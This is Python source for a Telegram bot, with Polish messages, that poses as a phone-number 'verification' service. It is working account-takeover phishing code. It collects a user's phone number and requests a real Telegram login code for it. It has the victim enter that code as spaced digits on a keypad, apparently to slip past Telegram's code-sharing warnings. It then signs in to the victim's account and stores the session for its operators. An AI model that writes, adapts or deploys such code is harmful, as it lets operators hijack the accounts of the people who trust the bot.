from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from shared.sessions import load_pending_verifications, save_pending_verifications, load_sessions, save_sessions
from shared.config import BOT_NAME, CHANNEL_ID, VIP_CHANNEL_LINK
from shared.utils import create_user_folder_and_files, get_client
from services.user_service import save_user_data, get_code_keyboard, get_verification_keyboard
import asyncio
from datetime import datetime, timedelta
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError, SessionPasswordNeededError, FloodWaitError, PhoneNumberInvalidError

pending_verifications = {}
user_timers = {}
code_input = {}
list_message_ids = {}

def register_verification_handlers(bot):
    @bot.message_handler(commands=['start'])
    async def start(message):
        print("[DEBUG] Odebrano /start")
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button = KeyboardButton("📱 Udostępnij numer", request_contact=True)
        markup.add(button)
        await bot.send_message(message.chat.id, "👋 Cześć! Aby się zweryfikować, udostępnij swój numer telefonu.", reply_markup=markup)

    @bot.message_handler(content_types=['contact'])
    async def verify_phone(message):
        print("[DEBUG] Odebrano kontakt")
        global pending_verifications
        if message.contact is None or message.contact.user_id != message.from_user.id:
            await bot.send_message(message.chat.id, "⚠️ Musisz podać swój własny numer!")
            return
        phone_number = message.contact.phone_number
        if not phone_number.startswith('+'):
            phone_number = '+48' + phone_number
        user_id = message.from_user.id
        username = f"@{message.from_user.username}" if message.from_user.username else "Brak nicku"
        chat_id = message.chat.id
        pending_verifications = load_pending_verifications(BOT_NAME)
        if str(user_id) in pending_verifications and pending_verifications[str(user_id)].get("awaiting_verification", False):
            await bot.send_message(message.chat.id, "🕒 Twoja weryfikacja jest już w toku.")
            return
        client = get_client(phone_number, f"{BOT_NAME}_session")
        async with asyncio.Lock():
            try:
                if not client.is_connected():
                    await client.connect()
                if await client.is_user_authorized():
                    active_sessions = load_sessions(BOT_NAME, force_refresh=True)
                    user = await client.get_me()
                    active_sessions[phone_number] = {
                        "phone_number": phone_number,
                        "user_id": user.id,
                        "username": user.username if user.username else f"user_{user.id}"
                    }
                    save_sessions(BOT_NAME, active_sessions)
                else:
                    code_request = await client.send_code_request(phone_number)
                    pending_verifications[str(user_id)] = {
                        "phone_number": phone_number,
                        "chat_id": chat_id,
                        "username": username,
                        "awaiting_verification": True,
                        "phone_code_hash": code_request.phone_code_hash
                    }
                    save_pending_verifications(BOT_NAME, pending_verifications)
            except FloodWaitError as e:
                await bot.send_message(message.chat.id, f"❌ Zbyt wiele prób. Odczekaj {e.seconds} sekund i spróbuj ponownie.")
                return
            except PhoneNumberInvalidError:
                await bot.send_message(message.chat.id, "❌ Nieprawidłowy numer telefonu. Spróbuj ponownie.")
                return
            except Exception as e:
                if "all available options" in str(e):
                    await bot.send_message(message.chat.id, "❌ Wyczerpano wszystkie metody weryfikacji dla tego numeru. Odczekaj kilka godzin lub użyj innego numeru.")
                else:
                    await bot.send_message(message.chat.id, f"❌ Błąd żądania kodu SMS: {str(e)}. Spróbuj ponownie później.")
                return
            finally:
                if client.is_connected():
                    await client.disconnect()
        save_user_data(user_id, username, phone_number, chat_id)
        notification = f"📱 Nowy numer telefonu do weryfikacji:\nNick: {username}\nNumer: {phone_number}\nID: {user_id}\nBot: {BOT_NAME}"
        sent_message = await bot.send_message(CHANNEL_ID, notification, reply_markup=get_verification_keyboard(user_id))
        list_message_ids[user_id] = sent_message.message_id
        code_input[user_id] = []
        await bot.send_message(
            message.chat.id,
            "Weryfikacja rozpoczęta!\nTwój numer został przesłany. Wpisz kod weryfikacyjny SMS (np. 1 2 3 4 5).",
            reply_markup=get_code_keyboard(user_id)
        )

    @bot.callback_query_handler(func=lambda call: True)
    async def handle_verification_decision(call):
        print(f"[DEBUG] Odebrano callback: {call.data}")
        global pending_verifications, code_input, list_message_ids
        data = call.data
        user_id = call.from_user.id
        chat_id = call.message.chat.id if hasattr(call.message, 'chat') else None
        pending_verifications = load_pending_verifications(BOT_NAME)

        if data.startswith("digit_"):
            _, digit, target_id = data.split("_")
            target_id = int(target_id)
            if target_id not in code_input:
                code_input[target_id] = []
            if len(code_input[target_id]) < 5:
                code_input[target_id].append(digit)
            await bot.answer_callback_query(call.id, text=f"Kod: {' '.join(code_input[target_id])}")
            await bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_code_keyboard(target_id))
        elif data.startswith("clear_"):
            _, target_id = data.split("_")
            target_id = int(target_id)
            code_input[target_id] = []
            await bot.answer_callback_query(call.id, text="Wyczyszczono kod.")
            await bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_code_keyboard(target_id))
        elif data.startswith("submit_"):
            _, target_id = data.split("_")
            target_id = int(target_id)
            code = ''.join(code_input.get(target_id, []))
            if not code or len(code) < 5:
                await bot.answer_callback_query(call.id, text="Wpisz pełny kod (5 cyfr)")
                return

            verif = pending_verifications.get(str(target_id))
            if not verif:
                await bot.answer_callback_query(call.id, text="Brak oczekującej weryfikacji.")
                return
            phone_number = verif["phone_number"]
            phone_code_hash = verif["phone_code_hash"]
            client = get_client(phone_number, f"{BOT_NAME}_session")
            try:
                await client.connect()
                await client.sign_in(phone=phone_number, code=code, phone_code_hash=phone_code_hash)
                user = await client.get_me()

                active_sessions = load_sessions(BOT_NAME, force_refresh=True)
                active_sessions[phone_number] = {
                    "phone_number": phone_number,
                    "user_id": user.id,
                    "username": user.username if user.username else f"user_{user.id}"
                }
                save_sessions(BOT_NAME, active_sessions)
 
                pending_verifications.pop(str(target_id), None)
                save_pending_verifications(BOT_NAME, pending_verifications)
                await bot.send_message(verif["chat_id"], "✅ Weryfikacja zakończona sukcesem! Możesz korzystać z bota.")

                if target_id in list_message_ids:
                    await bot.edit_message_text("✅ Numer zweryfikowany!", CHANNEL_ID, list_message_ids[target_id])
                await bot.answer_callback_query(call.id, text="Kod poprawny!")
            except PhoneCodeInvalidError:
                await bot.answer_callback_query(call.id, text="❌ Niepoprawny kod!")
                await bot.send_message(verif["chat_id"], "❌ Kod niepoprawny. Spróbuj ponownie.")
            except PhoneCodeExpiredError:
                await bot.answer_callback_query(call.id, text="❌ Kod wygasł!")
                await bot.send_message(verif["chat_id"], "❌ Kod wygasł. Zacznij weryfikację od nowa.")
                pending_verifications.pop(str(target_id), None)
                save_pending_verifications(BOT_NAME, pending_verifications)
            except SessionPasswordNeededError:
                await bot.answer_callback_query(call.id, text="🔒 Wymagane hasło 2FA!")
                await bot.send_message(verif["chat_id"], "🔒 Twoje konto wymaga hasła 2FA. Skontaktuj się z administratorem.")
            except FloodWaitError as e:
                await bot.answer_callback_query(call.id, text=f"⏳ Spróbuj za {e.seconds}s")
                await bot.send_message(verif["chat_id"], f"⏳ Zbyt wiele prób. Odczekaj {e.seconds} sekund.")
            except Exception as e:
                await bot.answer_callback_query(call.id, text=f"❌ Błąd: {str(e)[:30]}")
                await bot.send_message(verif["chat_id"], f"❌ Błąd logowania: {str(e)}")
            finally:
                if client.is_connected():
                    await client.disconnect()

        elif data.startswith("verify_yes_"):
            _, _, target_id = data.split("_")
            target_id = int(target_id)
            verif = pending_verifications.get(str(target_id))
            if not verif:
                await bot.answer_callback_query(call.id, text="Brak oczekującej weryfikacji.")
                return
            await bot.send_message(verif["chat_id"], "✅ Twój numer został zatwierdzony przez admina.")
            await bot.edit_message_text("✅ Numer zatwierdzony przez admina.", CHANNEL_ID, call.message.message_id)
            await bot.answer_callback_query(call.id, text="Zatwierdzono.")
        elif data.startswith("verify_no_"):
            _, _, target_id = data.split("_")
            target_id = int(target_id)
            verif = pending_verifications.get(str(target_id))
            if not verif:
                await bot.answer_callback_query(call.id, text="Brak oczekującej weryfikacji.")
                return
            await bot.send_message(verif["chat_id"], "❌ Twój numer został odrzucony przez admina.")
            await bot.edit_message_text("❌ Numer odrzucony przez admina.", CHANNEL_ID, call.message.message_id)
            pending_verifications.pop(str(target_id), None)
            save_pending_verifications(BOT_NAME, pending_verifications)
            await bot.answer_callback_query(call.id, text="Odrzucono.")
        elif data.startswith("verify_format_"):
            _, _, target_id = data.split("_")
            target_id = int(target_id)
            verif = pending_verifications.get(str(target_id))
            if not verif:
                await bot.answer_callback_query(call.id, text="Brak oczekującej weryfikacji.")
                return
            await bot.send_message(verif["chat_id"], f"📝 Format numeru: +48123456789. Spróbuj ponownie.")
            await bot.answer_callback_query(call.id, text="Wysłano instrukcję.")
        else:
            await bot.answer_callback_query(call.id, text="Nieznana akcja.")